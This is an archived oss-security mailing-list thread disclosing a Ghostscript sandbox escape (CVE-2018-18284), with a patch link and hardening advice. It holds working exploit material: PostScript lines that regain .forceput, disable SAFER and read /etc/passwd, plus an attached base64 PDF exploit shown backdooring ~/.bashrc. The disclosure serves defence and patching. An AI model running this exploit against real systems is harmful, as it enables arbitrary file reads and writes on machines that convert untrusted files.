X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["10019" "Wednesday" "17" "October" "2018" "13:48:53" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+Db=VQi14vEfA8AeRbqEfROwApCbgVqPQny7qbhj7nhw@mail.gmail.com>" "188" "[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" "^Date:" nil nil "10" "2018101720:48:53" "[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" (number mark "        taviso@googl Oct 17  188/10019 " thread-indent "\"[oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284\"\n") "<CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>" ("<CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 26373 invoked by uid 550); 17 Oct 2018 20:49:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26355 invoked from network); 17 Oct 2018 20:49:20 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=ajelgMLiIDSnRi7ngPkuVY6IghQawsffW6QKEFIzXYo=;
        b=BI94Dc1flSjZbzihdtJUsnWB9PwnztVOt6kQU+AaH3nOULPYcbwPRnz7DYyhK7uR3B
         nT1b/hs1OFfh7lLz/9jlkwht5GPLve1OlX0WbNFzOnxO4E73gjscP5rZw3QxQ8NwLXZH
         0u5erUBjNNEPrZhe9ta8aE3lQObr4ZMSg0ac5lobUpnX55dqmEwPHNXHX1t/eLrT2Fdn
         xcoAGMZRsdeP+JXu2u8J1n8usG7t+KgAZQDwDVp04yHlkjwcODIZ4ErocrITXGT0zOA/
         07X0G+HQX8hrHeYfQTGnCp1Pr0YkczhJv3QWzKs8MCPpMae4K1wIbF5/r362/Fkdr8jH
         LGMA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=ajelgMLiIDSnRi7ngPkuVY6IghQawsffW6QKEFIzXYo=;
        b=a5L+qEqWu9z4vAZo7cR0pB9wWi6QtGwBUN+SP8hOBakg7ydgInj7qPWQKqhYEY/33C
         Y/lm9tikeLHyZQPuH7Kq7EcgK6+WpBMEFGGt46BGkZgqDq2nfrSO7rAMuNGpiNAq5vOG
         o0NuBQrpMj3jZg3IjhcOhRYstw0xPk+uxSm1CO6/DqrYm8KmKvpyEJ2R/HDD1hXBrx+2
         TXTSa36AthoKb8oF1ape1t7ds04O1p4yuY38w/ZmI2QN7E/EsPahQ2kjYjSdl7BhXcmI
         psD6sQyeicfXpJpNaHKdsx2XCYXlArAEVjCRTZxrs50ZN2MZRAqEp1rWNBfzuM+NhRNM
         FZ/A==
X-Gm-Message-State: ABuFfohfAFdx3soW6ByomWx02JLE9ZGLisMZymJXwq18hu90NKf3MIEG
	568jpiKjdCrVduwlf1Qtm1t8wxgZkSgmO14vdGL9TVnJ2XVXXQ==
X-Google-Smtp-Source: ACcGV639SUvMuBNHTNq6464NHNdgdtwD/0YXYbuGf1Rf4k7646CPHVGDFsjCTbxKpmffqi4WV/Syj4R4i23nZ1zMSEA=
X-Received: by 2002:a0c:b512:: with SMTP id d18mr3126051qve.154.1539809346451;
 Wed, 17 Oct 2018 13:49:06 -0700 (PDT)
MIME-Version: 1.0
References: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
In-Reply-To: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
Message-ID: <CAJ_zFk+Db=VQi14vEfA8AeRbqEfROwApCbgVqPQny7qbhj7nhw@mail.gmail.com>
Content-Type: multipart/mixed; boundary="0000000000001e95e1057872cdc0"
Date: Wed, 17 Oct 2018 13:48:53 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
To: oss-security@lists.openwall.com

--0000000000001e95e1057872cdc0
Content-Type: multipart/alternative; boundary="0000000000001e95dd057872cdbe"

--0000000000001e95dd057872cdbe
Content-Type: text/plain; charset="UTF-8"

Apparently it wasn't clear that this allowed reading and writing of
arbitrary files, here is a full exploit (I just modified the CVE-2018-17961
exploit).

$ convert executeonly-bypass.pdf exploit.jpg
$ tail -1 ~/.bashrc
echo pwned by postscript


Thanks, Tavis.


On Tue, Oct 16, 2018 at 11:06 AM Tavis Ormandy <taviso@google.com> wrote:

> Hello, this
> <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696> is
> CVE-2018-18284, another ghostscript sandbox escape. Because procedures in
> postscript are just executable arrays, all system procedures need to be
> marked as executeonly, so that users cannot peek at their internals with
> array operators.
>
> We have also recently learned that they must be marked as
> pseudo-operators, otherwise their contents might leak to error handlers.
>
> That makes sense, unless the procedure itself is dangerous - in that case
> it must be hidden.
>
> 1Policy is a procedure that was correctly marked as executeonly and made a
> pseudo-operator, but was basically just a wrapper around .forceput. Here is
> how to exploit it:
>
> /.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
> get exec pop pop pop pop pop pop pop } def
>
> Once you have access to .forceput, you can basically do whatever you want,
> see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.
>
> Here is a simpler repro, just reading /etc/passwd:
>
> $ gs -dSAFER -sDEVICE=ppmraw
> GPL Ghostscript 9.25 (2018-09-13)
> Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
> This software comes with NO WARRANTY: see the file PUBLIC for details.
> GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
> get exec pop pop pop pop pop pop pop } def
> GS>systemdict /SAFER false .forceput
> GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
> GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
> GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
> GS>(/etc/passwd) (r) file 1024 string readline pop ==
> (root:x:0:0:root:/root:/bin/bash)
> GS>
>
> This patch solves it:
>
>
> http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b
>
> Side note: I'm done looking at ghostscript for now, but still *strongly*
> recommend that we deprecate untrusted postscript and disable ghostscript
> coders by default in policy.xml.
>
> Thanks, Tavis.
>

--0000000000001e95dd057872cdbe
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Apparently it wasn&#39;t=
 clear that this allowed reading and writing of arbitrary files, here is a =
full exploit (I just modified the CVE-2018-17961 exploit).<div><br></div><d=
iv><div><font face=3D"monospace, monospace">$ convert executeonly-bypass.pd=
f exploit.jpg</font></div></div><div><div><font face=3D"monospace, monospac=
e">$ tail -1 ~/.bashrc=C2=A0</font></div><div><font face=3D"monospace, mono=
space">echo pwned by postscript</font></div></div><div><br></div><div><br><=
/div><div>Thanks, Tavis.</div><div><br></div></div></div></div><br><div cla=
ss=3D"gmail_quote"><div dir=3D"ltr">On Tue, Oct 16, 2018 at 11:06 AM Tavis =
Ormandy &lt;<a href=3D"mailto:taviso@google.com">taviso@google.com</a>&gt; =
wrote:<br></div><blockquote class=3D"gmail_quote" style=3D"margin:0 0 0 .8e=
x;border-left:1px #ccc solid;padding-left:1ex"><div dir=3D"ltr"><div dir=3D=
"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr">Hello, <a href=3D"=
https://bugs.chromium.org/p/project-zero/issues/detail?id=3D1696" target=3D=
"_blank">this</a> is CVE-2018-18284, another ghostscript sandbox escape. Be=
cause procedures in postscript are just executable arrays, all system proce=
dures need to be marked as executeonly, so that users cannot peek at their =
internals with array operators.<div><br></div><div>We have also recently le=
arned that they must be marked as pseudo-operators, otherwise their content=
s might leak to error handlers.</div><div><br></div><div>That makes sense, =
unless the procedure itself is dangerous - in that case it must be hidden.<=
/div><div><br></div><div>1Policy is a procedure that was correctly marked a=
s executeonly and made a pseudo-operator, but was basically just a wrapper =
around .forceput. Here is how to exploit it:</div><div><br></div><div><div>=
<div><font face=3D"monospace, monospace">/.forceput { &lt;&lt;&gt;&gt; &lt;=
&lt;&gt;&gt; 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop =
pop pop pop pop pop pop } def</font></div></div></div><div><br></div><div>O=
nce you have access to .forceput, you can basically do whatever you want, s=
ee the exploit for CVE-2018-17961 a full example of backdooring .bashrc.</d=
iv><div><br></div><div>Here is a simpler repro, just reading /etc/passwd:</=
div><div><br></div><div><div><font face=3D"monospace, monospace">$ gs -dSAF=
ER -sDEVICE=3Dppmraw</font></div><div><font face=3D"monospace, monospace">G=
PL Ghostscript 9.25 (2018-09-13)</font></div><div><font face=3D"monospace, =
monospace">Copyright (C) 2018 Artifex Software, Inc.=C2=A0 All rights reser=
ved.</font></div><div><font face=3D"monospace, monospace">This software com=
es with NO WARRANTY: see the file PUBLIC for details.</font></div><div><fon=
t face=3D"monospace, monospace">GS&gt;/.forceput { &lt;&lt;&gt;&gt; &lt;&lt=
;&gt;&gt; 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop=
 pop pop pop pop pop } def</font></div><div><font face=3D"monospace, monosp=
ace">GS&gt;systemdict /SAFER false .forceput</font></div><div><font face=3D=
"monospace, monospace">GS&gt;systemdict /userparams get /PermitFileControl =
[(*)] .forceput</font></div><div><font face=3D"monospace, monospace">GS&gt;=
systemdict /userparams get /PermitFileWriting [(*)] .forceput</font></div><=
div><font face=3D"monospace, monospace">GS&gt;systemdict /userparams get /P=
ermitFileReading [(*)] .forceput</font></div><div><font face=3D"monospace, =
monospace">GS&gt;(/etc/passwd) (r) file 1024 string readline pop =3D=3D</fo=
nt></div><div><font face=3D"monospace, monospace">(root:x:0:0:root:/root:/b=
in/bash)<br></font></div><div><font face=3D"monospace, monospace">GS&gt;</f=
ont></div></div><div><br></div><div>This patch solves it:</div><div><br></d=
iv><div><a href=3D"http://git.ghostscript.com/?p=3Dghostpdl.git;h=3D8d19fdf=
63f91f50466b08f23e2d93d37a4c5ea0b" target=3D"_blank">http://git.ghostscript=
.com/?p=3Dghostpdl.git;h=3D8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b</a></di=
v><div><br></div><div>Side note: I&#39;m done looking at ghostscript for no=
w, but still <b>strongly</b> recommend that we deprecate untrusted postscri=
pt and disable ghostscript coders by default in policy.xml.=C2=A0</div><div=
><br></div><div>Thanks, Tavis.</div></div></div></div></div></div>
</blockquote></div>

--0000000000001e95dd057872cdbe--

--0000000000001e95e1057872cdc0
Content-Type: application/pdf; name="executeonly-bypass.pdf"
Content-Disposition: attachment; filename="executeonly-bypass.pdf"
Content-Transfer-Encoding: base64
Content-ID: <f_jndmp8640>
X-Attachment-Id: f_jndmp8640

JSFQUwolCiUgVGhpcyBpcyBnaG9zdHNjcmlwdCBidWcgNjk5OTYzLCAxUG9s
aWN5IGlzIGVxdWl2YWxlbnQgdG8gLmZvcmNlcHV0CiUKJSBQcm9qZWN0IFpl
cm8gYnVnIDE2OTYuCiUKCiUgOy0pCih3aGF0IGRvIHdlIHdhbnQ/XG4pIHBy
aW50CihcdGRlcHJlY2F0ZSB1bnRydXN0ZWQgcG9zdHNjcmlwdCFcbikgcHJp
bnQKKHdoZW4gZG8gd2Ugd2FudCBpdD9cbikgcHJpbnQKKFx0bm93IVxuKSBw
cmludAoKJSBub3cgd2UgaGF2ZSBhY2Nlc3MgdG8gZm9yY2VwdXQKL2ZvcmNl
cHV0IHsgPDw+PiA8PD4+IDQgaW5kZXggKGlnbm9yZWQpIDUgaW5kZXggNSBp
bmRleCAucG9saWN5cHJvY3MgMSBnZXQgZXhlYyBwb3AgcG9wIHBvcCBwb3Ag
cG9wIHBvcCBwb3AgfSBkZWYKCiUgTm93IHdlIGNhbiBkbyB3aGF0ZXZlciB3
ZSBsaWtlLCBsZXRzIGRpc2FibGUgU0FGRVIgYW5kIGdpdmUgb3Vyc2VsdmVz
IGFjY2VzcwolIHRvIHRoZSB3aG9sZSBmaWxlc3lzdGVtIChpbmNsdWRpbmcg
LmJhc2hyYywgc3NoIGtleXMsIGNocm9tZSBjb29raWVzLCBldmVyeXRoaW5n
KQpzeXN0ZW1kaWN0IC9TQUZFUiBmYWxzZSBmb3JjZXB1dApzeXN0ZW1kaWN0
IC91c2VycGFyYW1zIGdldCAvUGVybWl0RmlsZUNvbnRyb2wgWygqKV0gZm9y
Y2VwdXQKc3lzdGVtZGljdCAvdXNlcnBhcmFtcyBnZXQgL1Blcm1pdEZpbGVX
cml0aW5nIFsoKildIGZvcmNlcHV0CnN5c3RlbWRpY3QgL3VzZXJwYXJhbXMg
Z2V0IC9QZXJtaXRGaWxlUmVhZGluZyBbKCopXSBmb3JjZXB1dAoKJSBEZW1v
bnN0cmF0ZSByZWFkaW5nIGEgZmlsZSB3ZSBzaG91bGRudCBoYXZlIGFjY2Vz
cyB0by4KKC9ldGMvcGFzc3dkKSAocikgZmlsZSBkdXAgNjQgc3RyaW5nIHJl
YWRsaW5lIHBvcCA9PSBjbG9zZWZpbGUKCiUgVGhlIGdldGVudiBvcGVyYXRv
ciBnZXRzIHJlbW92ZWQgYW5kIHdlIGNhbid0IGdldCBpdCBiYWNrLCBoZXJl
IGlzIGEKJSByZXBsYWNlbWVudC4KJSAoSE9NRSkgbmV3Z2V0ZW52ICgvcGF0
aC90by9ob21lKSB0cnVlICAgICAlIGZvdW5kCiUgKGZvb2JhcikgbmV3Z2V0
ZW52IGZhbHNlICAgICAgICAgICAgICAgICAgJSBub3Rmb3VuZAovbmV3Z2V0
ZW52IHsKICAgICUgcmVhZCBlbnRpcmUgZW52aXJvbm1lbnQgaW50byBzdHJp
bmcKICAgICgvcHJvYy9zZWxmL2Vudmlyb24pIChyKSBmaWxlIGR1cCAzMjc2
OCBzdHJpbmcgcmVhZHN0cmluZyBwb3AgZXhjaCBjbG9zZWZpbGUKCiAgICAl
IHNlYXJjaCBmb3IgdmFyaWFibGUKICAgIGV4Y2ggZHVwIChcMCkgZXhjaCBj
b25jYXRzdHJpbmdzICg9KSBjb25jYXRzdHJpbmdzIGV4Y2ggMyAxIHJvbGwg
c2VhcmNoIG5vdCB7CiAgICAgICAgJSBub3QgZm91bmQsIGNvdWxkIGJlIGF0
IHRoZSBzdGFydCwgc28gbm8gbGVhZGluZyBudWw/CiAgICAgICAgMSBpbmRl
eCAoPSkgY29uY2F0c3RyaW5ncyBhbmNob3JzZWFyY2ggbm90IHsKICAgICAg
ICAgICAgKG5vdGZvdW5kKQogICAgICAgIH0geyBwb3AgfSBpZmVsc2UKICAg
IH0geyBwb3AgcG9wIH0gaWZlbHNlCgogICAgJSByZW1vdmUgZXZlcnl0aGlu
ZyBhZnRlciBwYXRoLCB0aGVyZSBpcyBhbHdheXMgYSBudWwgb24gTGludXgu
CiAgICAoXDApIHNlYXJjaCB7IDQgMSByb2xsIHBvcCBwb3AgcG9wIHRydWUg
fSB7CiAgICAgICAgJSBtdXN0IGJlIHRoZSBub3Rmb3VuZCBzdHJpbmcKICAg
ICAgICBwb3AgcG9wIHBvcCBmYWxzZQogICAgfSBpZmVsc2UKfSBkZWYKCiUg
SGVyZSBpcyBob3cgdG8gZWRpdCAuYmFzaHJjLi4uCi9iYWNrZG9vcmJhc2gg
ewogICAgJSBub3cgd2UgY2FuIGFwcGVuZCB0byBiYXNocmMKICAgIChIT01F
KSBuZXdnZXRlbnYgcG9wICgvLmJhc2hyYykgY29uY2F0c3RyaW5ncyAoYSkg
ZmlsZSBkdXAKCiAgICAlIGJhY2tkb29yCiAgICAoZWNobyBwd25lZCBieSBw
b3N0c2NyaXB0XG4pIHdyaXRlc3RyaW5nCgogICAgJSBhbGwgZG9uZQogICAg
Y2xvc2VmaWxlCn0gZGVmCgpiYWNrZG9vcmJhc2gKcXVpdAo=

--0000000000001e95e1057872cdc0--
